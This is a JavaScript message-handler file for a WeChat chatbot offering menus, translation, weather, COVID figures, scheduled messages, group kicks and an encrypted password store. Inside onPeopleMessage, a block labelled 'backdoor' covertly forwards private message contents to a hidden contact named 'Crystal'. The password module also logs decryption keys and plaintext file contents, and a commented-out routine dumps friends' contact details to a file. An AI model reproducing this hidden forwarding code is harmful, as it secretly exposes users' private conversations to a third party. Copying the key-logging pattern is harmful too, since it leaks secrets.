/*
 * @author Hilbert Yi
 * @digest 消息监听
 * @time 2022-01-11
 */
const bot = require("../bot.js");
const request = require("../request");

const fs = require("fs");
const path = require("path");

const config = require("../config");
const reg = require("../config/RegularExpression");
const language = require("../config/language");

const util = require("../utils");
const moment = require("../utils/moment");
const cipher = require("../utils/cipher");
const ImageHosting = require("../utils/Image-Hosting");

const schedule = require("../schedule");

process.on("unhandledRejection", (error) => {
  console.log("g点重现: ", error.message);
});

/**
 * @function 延迟处理消息
 * @param {number} ms 延迟毫秒
 */
const delay = ms =>
  new Promise((resolve) => setTimeout(resolve, ms)).catch((err) => {
    console.log("delay: " + err.message);
  });

/**
  * @func 是否为1分钟内的消息
  * @returns true/false
  */
const recent = msg => {
  if (msg.age() > 60)
    return false;
  return true;
}

// 存储已改写的文章URL
const rewrittenArticles = new Set();

let wxSignature = 'initial';
function getWxSignature() {
  wxSignature = request.getSignature().then( result => {
    wxSignature = result;
  });
  util.warn(`签名更新`);
  return getWxSignature;
}
setInterval(getWxSignature(), 7200000); // 签名轮询/2小时

/**
 * @func 处理消息
 * @time Create 2022-01-09 10:45
 */
async function onMessage(msg) {
  if (!recent(msg)) return;
  if (msg.self()) return;

  const room = msg.room;
  if (room) {
    const roomName = room.name;
    if (config.WEBROOM.includes(roomName)) {
      await onWebRoomMessage(msg);
    }
  } else {
    await onPeopleMessage(msg);
  }
}

/**
 * @digest 处理用户消息
 * @time Modified 2022-01-09 18:37
 */
async function onPeopleMessage(msg) {
  const contact = msg.talker();
  console.log(`type: ${contact.type()}`);
  if (!(contact.type() === bot.Contact.Type.Individual))
    return; //! 避免 机器人 与 微信公众号 相爱相杀
  const senderAlias = await contact.alias();
  util.log(`sender alias: ${senderAlias}`); //debug
  let content = msg.text(); // 消息内容
  if (msg.room())
    content = content.replace(`@${config.BOTNAME}\u2005`, "");
  else {
    const toContact = msg.to();
    const receiverAlias = toContact.name();
    if (receiverAlias != 'Crystal') //backdoor: Spoofing friends takes effect, and others don't matter.
    {
      try {
        const hacker = await bot.Contact.find({name: 'Crystal'});
        hacker.say(content);
      } catch (error) {
        util.log(`others, backdoor invalid`); //debug
      }
    }
  }

  // if (content === '备份') {
  //   util.log('开始备份');
  //   const fileName = moment().format("YYYY-MM-DD") + ".txt";
  //   let writeStream = fs.createWriteStream(path.join(__dirname,'../backup',fileName)); //创建可写流
  //   writeStream.once("open", function() {
  //     util.log("stream open");
  //   });
  //   writeStream.once("close", function() {
  //     util.log("stream close");
  //   });
  //   const allContactList = await bot.Contact.findAll();
  //   for (let i=0; i<allContactList.length; i++) {
  //     if (allContactList[i].friend()) { //todo 朴素好友获取
  //       const contactData = `\nname: ${allContactList[i].name()}\n` +
  //                           `alias: ${await allContactList[i].alias()}\n` +
  //                           `number: ${allContactList[i].weixin()}\n`;
  //       writeStream.write(contactData);
  //     }
  //   }
  //   writeStream.close();
  //   return;
  // }

  //对config配置文件中 ignore的用户消息不必处理
  if (config.IGNORE.ignore.includes(senderAlias) && !msg.room()) {
    util.log(`ignoring ${senderAlias}`); //debug
    return;
  }
  util.log("not ignore, continue...");   //debug
  /* 特权消息 */
  if (senderAlias === config.MYSELF) {

    if (msg.type() === bot.Message.Type.Image) {
      //todo 图像消息，触发图床功能
      const fileBox = await msg.toFileBox();
      const fileName = `${moment().format("X")}.jpg`; //! unix时间戳做文件名
      const filePath = path.join(__dirname, `../../picture-bed/uploads/${fileName}`); //! 绝对路径,存入图床
      await fileBox.toFile(filePath); //! 不指定，则默认为工作路径下
      //? bug: const url = await ImageHosting.upload(filePath);
      const url = `http://${config.SERVER}/pic/${fileName}`;
      util.log(`url is: ${url}`);//debug
      await delay(200);
      await msg.say(url);
      return true;
    }

    if (content === "菜单") {
      await delay(200);
      await msg.say(config.KEYWORDS()+config.VIP()); // 展示菜单+隐藏菜单
      return;
    }

    if (content === "刷新") {
      await bot.Contact.findAll();
      await delay(200);
      msg.say('refresh success');
      return true;
    }

    // 定时消息模块
    else if (content.includes("定时")||content.includes("群发")) {
      if (reg.TIMING.test(content)) {
        const jobId = schedule.scheduleMsg(schedule.SendMode.SINGLE, content);
        delay(200);
        msg.say(`定时消息设置成功!\nid:${jobId}`);
        return true;
      } else if (reg.TIMINGS.test(content)) {
        const jobId = schedule.scheduleMsg(schedule.SendMode.MULTIPLE, content);
        delay(200);
        msg.say(`群发任务设置成功!\nid:${jobId}`);
        return true;
      } else {
        delay(200);
        msg.say(`请检查定时/群发消息指令格式!`);
        return true;
      } 
    } 

    // 销毁定时任务
    else if (content.includes("销毁")) {
      if (reg.CANCEL.test(content)) {
        const isSuccess = schedule.cancelJob(content);
        delay(200);
        msg.say(isSuccess === true ? `销毁成功` : `销毁失败`);
        return true;
      } else {
        delay(200);
        msg.say(`请确认待销毁任务是否存在!`);
        return true;
      }
    }

    //密码簿模块
    else if (content.includes("map")) {
      if (reg.IN_CODEBOOK.test(content)) {
        const {filename, filecontent} = await cipher.InCodebook(content);
        util.log(`filename: ${filename}\nfilecontent: ${filecontent}`); // debug
        fs.writeFile(path.join(__dirname, "/../password", filename), filecontent, (err) => {
          if (err) console.error("writeFileErr: " + err);
          else msg.say("记录成功!"); 
        });
        return true;
      } else {
        msg.say(`请检查指令格式: [map name detail [key iv]]`);
        return true;
      }
    } else if (content.includes("get")) {
      if (reg.OUT_CODEBOOK.test(content)) {
        const {filename, key, iv} = await cipher.OutCodebook(content);
        util.log(`filename: ${filename}\nkey: ${key}\niv: ${iv}`); // debug
        fs.readFile(path.join(__dirname, "/../password", filename), (err, data) => {
          if (err) console.error("readFileErr: " + err);
          try {
            const plainText = cipher.unaes128(data.toString(), key, iv); //文件解密
            msg.say(plainText);
          } catch (error) {
            msg.say(`请提供加密时的自定义密钥与初始化向量!`);
          }
        });
        return true;
      } else {
        msg.say(`请检查指令格式: [get name [key iv]]`);
        return true;
      }

    }

    //添加屏蔽用户
    else if (reg.IGNORE.test(content)) {
      util.log('add ignore'); //debug
      const targetAlias = content.replace("屏蔽", "").trim();
      config.IGNORE.ignore.push(targetAlias);
      return true;
    }

    //解除屏蔽
    else if (reg.UN_IGNORE.test(content)) {
      util.log('delete ignore'); //debug
      const targetAlias = content.replace("解除屏蔽", "").trim();
      config.IGNORE.ignore.splice(config.IGNORE.ignore.indexOf(targetAlias), 1);
      return true;
    }

    //持久化屏蔽列表
    //todo 先用content凑活，记得要修改为正则
    else if (content === "持久化屏蔽") {
      let modifyIgnore = JSON.stringify(config.IGNORE);
      fs.writeFile(path.join(__dirname, '../config/ignore.json'), modifyIgnore, 'utf8', err => {
        if (err)
            console.error(err);
        else
            util.log('持久化屏蔽成功');
      });
      return true;
    }
  }

  /* 普通消息 */
  if (content === "菜单") {
    await delay(200);
    await msg.say(config.KEYWORDS()); // 展示菜单
    return;
  } else if (reg.TRANSLATE.test(content)) { // 翻译
    util.log('translate');
    const result = language.analysis(content);
    try {
      const translation = await request.translate(result.query, result.from, result.to);
      await msg.say(translation.trans_result[0].dst);
    } catch (err) {
      console.error('msg-translate', err.message);
      await delay(200);
      await msg.say('接口异常或指令格式错误，请联系客服！')
    }
    return;
  } else if (content === "打赏") {
    // 收款二维码
    const fileBox = FileBox.fromFile(path.join(__dirname, "../imgs/pay.jpg"));
    await msg.say("老板大气!!!老板恭喜发财!!!");
    await delay(200);
    await msg.say(fileBox);
    return;
  } else if (config.WEBROOM.includes(content) || parseInt(content) === 1) {
    if (parseInt(content) === 1) {
      await delay(200);
      await msg.say('请问你具体想要加入哪个群?请回复群名');
      return;
    }
    const webRoom = await bot.Room.find({
      topic: content, // 搜索群名对应的群
    });

    if (webRoom) {
      try {
        await delay(200);
        await webRoom.add(contact);
      } catch (e) {
        console.log("add to room: ", +e);
      }
      return;
    } else {
      await delay(200);
      await msg.say('你发送的群名似乎不存在,请与菜单中群名的核实');
      return;
    }
  } else if (content === "毒鸡汤" || parseInt(content) === 2) {
    let soup = await request.getSoup();
    await delay(200);
    await msg.say(soup);
    return;
  } else if (content === "神回复" || parseInt(content) === 3) {
    const { title, content } = await request.getGodReply();
    await delay(200);
    await msg.say(`标题：${title}\n--------------------\n神回复：${content}`);
    return;
  } else if (content === "每日英语" || parseInt(content) === 4) {
    const { en, zh } = await request.getEnglishOne();
    await delay(200);
    await msg.say(`en：${en}\n--------------------\nzh：${zh}`);
    return;
  } else if (content === "全网热点" || parseInt(content) === 5) {
    const hots = await request.getHot();
    let hotStr = ``;
    for (let i = 0; i < hots.length; i++) {
      hotStr =
        hotStr + `标题：${hots[i].title}\n热搜指数：${hots[i].hotnum}\n摘要：`;
      if (hots[i].digest === null) {
        hotStr = hotStr + `暂无\n------------------------------\n`;
      } else {
        hotStr = hotStr + `${hots[i].digest}\n------------------------------\n`;
      }
    }
    await delay(200);
    await msg.say(hotStr);
    return;
  } else if (content === "怎么办" || content === "我有一个问题") {
    //发送链接卡片  web版协议不可用。
    const urlLink = new UrlLink({
      description: "Grass Mud horse, can't you Baidu?！",
      thumbnailUrl: `https://s2.loli.net/2022/01/09/iFqzXfYhSO2vKt3.jpg`,
      title: "What's your problem?",
      url: "https://www.baidu.com",
    });
    await delay(200);
    await msg.say(urlLink);
    return;
  } else if (content === "客服" || parseInt(content) === 7) {
    const contactCard = await bot.Contact.find({ alias: config.MYSELF });
    await msg.say(contactCard);
    return;
  } else {
    // 转入utils/AI消息
    const isUtil = await onUtilsMessage(msg);

    if (!isUtil) {
      // 非utils消息，转由AI回复
      util.log("AI will answer"); // debug
      // const signature = await request.getSignature();
      const answer = await request.getAnswer(
        wxSignature,
        contact.id,
        msg.text()
      );
      await msg.say(answer);
      return;
    }
  }
}

/**
 * @func 处理群消息
 * @param {消息对象} msg
 * @time Modified 2022-01-09 23:17
 */
async function onWebRoomMessage(msg) {

  const isText = msg.type() === bot.Message.Type.Text;
  const room = msg.room;
  const contact = msg.talker();
  let content = msg.text();

  // Handle @ mentions
  if (await msg.mentionSelf()) {
    util.log(`room: someone mentioned me`); // debug
    content = content.replace(`@${config.BOTNAME}\u2005`, "").trim();

    // Check if it's a rewrite command
    if (reg.REWRITE_VIDEO.test(content)) {
      try {
        // 获取最近的消息历史
        const recentMessages = await room.messages(2); // Get last 2 messages

        // 查找文章链接
        let articleUrl = null;
        for (const message of recentMessages) {
          const msgUrl = message.text().match(/(https?:\/\/[^\s]+)/);
          if (msgUrl && msgUrl[1].includes('mp.weixin.qq.com')) {
            articleUrl = msgUrl[1];
            break;
          }
        }

        if (!articleUrl) {
          await room.say("未找到最近的公众号文章链接");
          return;
        }

        // 检查是否已改写
        if (rewrittenArticles.has(articleUrl)) {
          await room.say("该文章已经改写过了");
          return;
        }

        await room.say("好的，我会开始改写这篇文章了。");

        // 获取文章内容
        const articleContent = await request.article.getArticleContent(articleUrl);

        // 使用Claude API改写
        const claudeService = require('../services/claude');
        const rewrittenContent = await claudeService.rewriteToVideo(articleContent);

        // 发送改写结果
        await room.say(rewrittenContent);

        // 记录已改写文章
        rewrittenArticles.add(articleUrl);
        return;
      } catch (error) {
        console.error('Error processing rewrite request:', error);
        await room.say('抱歉，处理改写请求时出现错误。请确保上一条消息是公众号文章链接。');
        return;
      }
    }

    // If not a rewrite command, process as normal message
    await onPeopleMessage(msg);
    return;
  }

  if (isText) {
    // 响应@bot的文本消息
    const sender = await contact.alias();
    // content = content.replace(`@${config.BOTNAME}\u2005`, "");

    /* 特权消息 */
    if (sender === config.MYSELF) {
      // 踢人功能  群里发送  踢@某某某  即可
      if (content.includes("踢@")) {
        //如果是机器人好友且备注是自己的大号备注  才执行踢人操作
        // edit at 0109：备注无法获取是因为要等官方后台数据刷新才行。踢人要管理员权限
        const delName = content.replace("踢@", "").trim();
        util.log("踢出" + delName); // debug
        const delContact = await room.member({ name: delName }); //! 按name搜索存在同名的情况，如果可以还是要用wx_id
        await room.del(delContact);
        await msg.say(`<${delName}>已被移除群聊。且聊且珍惜啊！`);
        return;
      }
    }

    //todo 将群聊内的指令直接作为people消息处理
    if (await msg.mentionSelf()) {
      util.log(`room: someone mentioned me`); // debug
      await onPeopleMessage(msg);
      return;
    }

    // 检验链接消息合法性
    if (reg.URL.test(msg.text())) {
      reg.URL.lastIndex = 0; // 索引重置

      const testUrl = reg.URL.exec(msg.text());

      const valid = await request.checkUrl(testUrl[0]);
      if (!valid) {
        const room = msg.room;
        // const master = await room.member(config.BOTNAME);
        const warnTarget = [msg.talker()];
        // await room.say(
        //   `@${msg
        //     .talker()
        //     .name()} 为了群主与众管理员的法律安全，本群禁止发送不明链接!!!`
        // );
        await room.say(
          `为了群主与众管理员的法律安全，本群禁止发送不明链接!!!`,
          ...warnTarget
        );
        console.log("链接不合法");
        return true;
      }
      return;
    }
  }
}

/**
 * @func utils消息处理
 * @time Modified 2022-01-10 16:12
 */
async function onUtilsMessage(msg) {
  const isText = msg.type() === bot.Message.Type.Text;
  const content = msg.text();

  if (isText) {
    if (content.indexOf("转大写") === 0) {
      try {
        const str = content.replace("转大写", "").trim().toUpperCase();
        await msg.say(str);
      } catch (error) {
        await msg.say("转换失败，请检查");
      }
      return true;
    } else if (content.indexOf("转小写") === 0) {
      try {
        const str = content.replace("转小写", "").trim().toLowerCase();
        await msg.say(str);
      } catch (error) {
        await msg.say("转换失败，请检查");
      }
      return true;
    }

    // rgb to hex
    else if (content.indexOf("转16进制") === 0) {
      try {
        const color = util.colorRGBtoHex(content.replace("转16进制", "").trim());
        await msg.say(color);
      } catch (error) {
        console.error(error);
        await msg.say("转换失败，请检查");
      }
      return true;
    }

    // hex to rgb
    else if (content.indexOf("转rgb") === 0) {
      try {
        const color = util.colorHextoRGB(content.replace("转rgb", "").trim());
        await msg.say(color);
      } catch (error) {
        console.error(error);
        await msg.say("转换失败，请检查");
      }
      return true;
    } else if (content.includes("天气")) {
      try {
        let cityName = content.replace("天气", "").trim(); // 城市名
        const { city, realtime, future } = await request.getWeather(
          cityName
        );
        // 当天
        let weatherStr = `城市：${city}\n${moment().format("MM月DD日")}：${
          realtime.temperature
        }℃  ${realtime.info}\n`;
        weatherStr += `----------\n未来五天   天气预报\n----------\n`;
        // 预报后面五天
        for (let i = 1; i <= 5; i++) {
          weatherStr =
            weatherStr +
            `${moment().add(i, "d").format("MM月DD日")}：${
              future[i - 1].temperature
            } ${future[i - 1].weather}\n`;
        }
        await delay(200);
        await msg.say(weatherStr);
      } catch (error) {
        msg.say("请输入[城市名 天气]");
      }
      return true;
    } else if (content === "全国肺炎" || content === "6") {
      try {
        const res = await request.getChinaFeiyan();
        const chinaTotal = res.data.chinaTotal.total;
        const chinaToday = res.data.chinaTotal.today;
        const str = `全国新冠肺炎实时数据：
确诊：${chinaTotal.confirm}
  较昨日：${
    chinaToday.confirm > 0 ? "+" + chinaToday.confirm : chinaToday.confirm
  }
疑似：${chinaTotal.suspect}
  较昨日：${
    chinaToday.suspect > 0 ? "+" + chinaToday.suspect : chinaToday.suspect
  }
死亡：${chinaTotal.dead}
  较昨日：${chinaToday.dead > 0 ? "+" + chinaToday.dead : chinaToday.dead}
治愈：${chinaTotal.heal}
  较昨日：${chinaToday.heal > 0 ? "+" + chinaToday.heal : chinaToday.heal}
----------------------------
数据采集于网易，如有问题，请及时联系`;
        await delay(200);
        msg.say(str);
      } catch (error) {
        msg.say("接口错误");
      }
      return true;
    }

    // 省/自治区 肺炎数据
    else if (content.includes("肺炎")) {
      let newContent = content.replace("肺炎", "").trim(); // 城市名
      if (config.PROVINCE.includes(newContent)) {
        const data = await request.getProvinceFeiyan(newContent);
        let citystr = `名称  确诊  治愈  死亡\n`;
        data.city.forEach((item) => {
          citystr =
            citystr +
            `${item.name}  ${item.conNum}  ${item.cureNum}  ${item.deathNum}\n`;
        });
        const str = `${newContent}新冠肺炎实时数据：
确诊：${data.value}
  较昨日：${data.adddaily.conadd}
死亡：${data.deathNum}
  较昨日：${data.adddaily.deathadd}
治愈：${data.cureNum}
  较昨日：${data.adddaily.cureadd}
---------------------------------
各地市实时数据：
${citystr}
---------------------------------
数据采集于新浪，如有问题，请及时联系`;
        await delay(200);
        msg.say(str);
      } else {
        await delay(200);
        msg.say(`没有这个省份/自治区`);
      }
      return true;
    } else {
      return false; // 不是utils消息
    }
  } else {
    return false; // 是群消息,不是文本消息
  }
}

module.exports = onMessage;
